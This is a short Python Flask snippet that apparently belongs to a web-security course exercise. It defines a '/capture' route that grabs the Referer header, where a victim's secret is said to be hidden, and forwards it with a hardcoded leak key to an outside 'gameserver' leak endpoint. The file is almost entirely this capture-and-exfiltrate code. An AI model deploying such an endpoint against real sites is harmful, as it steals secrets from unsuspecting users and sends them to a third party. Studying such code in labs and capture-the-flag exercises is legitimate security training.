import requests
from flask import request # or your specific framework's request object

@app.route('/capture')
def capture():
    # 1. Extract the Referer header (where the secret is hidden)
    referer = request.headers.get('Referer')
    
    if referer:
        # 2. Prepare the leak parameters
        leak_secret = "3b4321f361abd94cf42521e814840777"
        
        # 3. Forward the secret to the gameserver backend-to-backend
        leak_url = f"https://gameserver.websec.saarland/leak"
        params = {
            'secret': leak_secret,
            'data': referer
        }
        requests.get(leak_url, params=params)
        
        return "Secret captured and leaked!", 200
    
    return "No Referer found.", 400
